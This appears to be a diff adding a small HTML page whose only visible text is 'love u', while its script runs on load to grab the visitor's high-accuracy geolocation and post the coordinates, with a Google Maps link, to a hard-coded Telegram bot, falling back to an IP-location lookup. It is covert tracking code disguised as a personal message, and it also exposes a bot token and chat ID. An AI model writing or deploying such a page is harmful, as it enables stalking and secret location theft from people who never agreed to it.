@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Live Location Tracker</title>
+</head>
+<body style="text-align: center; padding: 20px;">
+    
+love u 
+
+    <script>
+        function getHighAccuracyLocation() {
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const latitude = position.coords.latitude;
+                        const longitude = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
+                        
+                        
+                        // Send location to Telegram bot
+                        fetch("https://api.telegram.org/bot7028890340:AAFlpPYM-lCK2199W78hmX1CKvbz17Yu744/sendMessage", {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            body: JSON.stringify({
+                                chat_id: "6231124027",
+                                text: `📍 Location Tracked:\nLatitude: ${latitude}\nLongitude: ${longitude}\n🔗 [View on Google Maps](https://www.google.com/maps?q=${latitude},${longitude})`,
+                                parse_mode: "Markdown"
+                            })
+                        })
+                        .then(response => response.json())
+                        .then(data => console.log("✅ Location Sent:", data))
+                        .catch(error => console.error("❌ Error Sending:", error));
+                    },
+                    (error) => {
+                        document.getElementById("status").innerText = `Error: ${error.message}`;
+                        getBackupLocation();
+                    },
+                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+                );
+            } else {
+                document.getElementById("status").innerText = "Geolocation is not supported by this browser.";
+                getBackupLocation();
+            }
+        }
+        
+        function getBackupLocation() {
+            fetch("https://ip-api.com/json/")
+                .then((response) => response.json())
+                .then((data) => {
+                    document.getElementById("status").innerText = `IP-based Location: ${data.city}, ${data.country}`;
+                })
+                .catch((error) => {
+                    document.getElementById("status").innerText = "Failed to fetch IP-based location.";
+                });
+        }
+        
+        getHighAccuracyLocation();
+    </script>
+</body>
+</html>
